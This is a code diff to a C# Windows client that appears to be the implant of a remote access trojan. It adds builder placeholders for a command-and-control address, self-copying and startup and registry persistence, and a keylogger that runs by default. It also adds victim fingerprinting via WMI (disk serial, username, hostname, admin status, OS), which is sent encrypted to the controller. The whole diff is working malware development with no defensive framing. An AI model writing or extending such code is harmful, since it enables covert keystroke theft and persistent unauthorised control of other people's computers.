@@ -29,26 +29,112 @@ using System.Threading;
 using System.Net.Sockets;
 using System.Net;
 using System.Reflection;
-using winClient48Small;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Data;
+using System.Management;
+using System.Security.Principal;
+using System.Threading.Tasks;
+using System.Diagnostics;
 
-namespace winClient48
+namespace winClient48Small
 {
     public partial class Form1 : Form
     {
+        private string id_prefix = "[PREFIX]";
+
         private Socket m_Socket;
         private bool m_bConnected = false;
 
-        private string m_szIPAddr = "127.0.0.1";
-        private int m_nPort = 5000;
+        private string m_szIPAddr = "[IP]";
+        private int m_nPort = int.Parse("[PORT]");
 
-        private int m_nTimeout = 10000; //ms
-        private int m_nRetry = 10000; //ms
+        private int m_nTimeout = int.Parse("[TIMEOUT]"); //ms
+        private int m_nRetry = int.Parse("[RETRY]"); //ms
+
+        //Install
+        private bool m_bCopyDir = bool.Parse("[IS_CP_DIR]");
+        private string m_szCopyDir = "[IS_SZ_DIR]"; //Dir name (path or path variable)
+        private bool m_bCopyStartUp = bool.Parse("[IS_CP_STARTUP]");
+        private string m_szCopyStartUp = "[IS_SZ_STARTUP]"; //Filename
+        private bool m_bReg = bool.Parse("[IS_REG]");
+        private string m_szRegKeyName = "[IS_REG_KEY]"; //Registry key name
+
+        //Misc
+        private string m_szKeylogFileName = "[KL_FILE]";
+        private bool m_bKeylogger = bool.Parse("True");
+
+        private KeyLogger keylogger;
+        private Installer installer;
 
         public Form1()
         {
             InitializeComponent();
+        }
+
+        private string fnGenerateRandomStr(int nLength = 10)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            StringBuilder result = new StringBuilder(nLength);
+            Random random = new Random();
+
+            for (int i = 0; i < nLength; i++)
+            {
+                result.Append(chars[random.Next(chars.Length)]);
+            }
+
+            return result.ToString();
+        }
+
+        private bool fnIsAdmin()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        public static DataTable fnWmiQuery(string query)
+        {
+            DataTable dt = new DataTable();
+            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+            {
+                using (ManagementObjectCollection col = searcher.Get())
+                {
+                    foreach (ManagementObject obj in col)
+                    {
+                        DataRow dr = dt.NewRow();
+                        foreach (PropertyData prop in obj.Properties)
+                        {
+                            if (!dt.Columns.Contains(prop.Name))
+                            {
+                                dt.Columns.Add(prop.Name);
+                            }
+
+                            dr[prop.Name] = prop.Value?.ToString() ?? "N/A";
+                        }
+
+                        dt.Rows.Add(dr);
+                    }
+                }
+            }
+
+            return dt;
+        }
+
+        private string fnGetOS()
+        {
+            try
+            {
+                DataTable dt = fnWmiQuery("SELECT Caption FROM Win32_OperatingSystem");
+                string szOS = dt.Rows[0][0].ToString();
+
+                return szOS;
+            }
+            catch (Exception ex)
+            {
+                return "Unknown";
+            }
         }
 
         private byte[] CombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
@@ -129,7 +215,21 @@ namespace winClient48
                                 }
                                 else if (dsp.Param == 4)
                                 {
-                                    s.Send(3, 0, "Hello");
+                                    DataTable dt = fnWmiQuery("select serialnumber from win32_diskdrive");
+                                    string szSerialNumber = dt.Rows[0][0].ToString().Replace(" ", string.Empty).Trim();
+                                    string szOnlineID = $"{id_prefix}_{Dns.GetHostName()}_{szSerialNumber}";
+
+                                    string szData = string.Join("|", new string[]
+                                    {
+                                        szOnlineID,
+                                        Environment.UserName,
+                                        Dns.GetHostName(),
+                                        m_bKeylogger ? "Yes" : "No",
+                                        fnIsAdmin() ? "Yes" : "No",
+                                        fnGetOS(),
+                                    });
+
+                                    s.encSend(3, 0, szData);
                                 }
                             }
                             else if (dsp.Command == 2) //COMMAND AND CONTROL
@@ -142,7 +242,11 @@ namespace winClient48
                                 }
                                 else if (dsp.Param == 1) //PIGN TIME, LATENCY
                                 {
-                                    s.encSend(2, 1, DateTime.Now.ToString("F"));
+                                    Task.Run(() =>
+                                    {
+                                        Thread.Sleep(1000);
+                                        s.encSend(2, 1, clsEZData.fnGenerateRandomStr());
+                                    });
                                 }
                             }
                         }
@@ -227,6 +331,19 @@ namespace winClient48
         void Main()
         {
             m_bConnected = false;
+            installer = new Installer();
+            installer.m_szCurrentPath = Process.GetCurrentProcess().MainModule.FileName;
+            installer.m_bCopyDir = m_bCopyDir;
+            installer.m_szCopyPath = Environment.ExpandEnvironmentVariables(Path.Combine(m_szCopyDir, Path.GetFileName(installer.m_szCurrentPath)));
+            installer.m_bStartUp = m_bCopyStartUp;
+            installer.m_szStartUpName = Environment.ExpandEnvironmentVariables(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), m_szCopyStartUp));
+            installer.m_bReg = m_bReg;
+            installer.m_szRegKeyName = m_szRegKeyName;
+
+            installer.Start();
+
+            keylogger = new KeyLogger(m_szKeylogFileName);
+            new Thread(() => keylogger.Start()).Start();
             new Thread(() =>
             {
                 while (true)
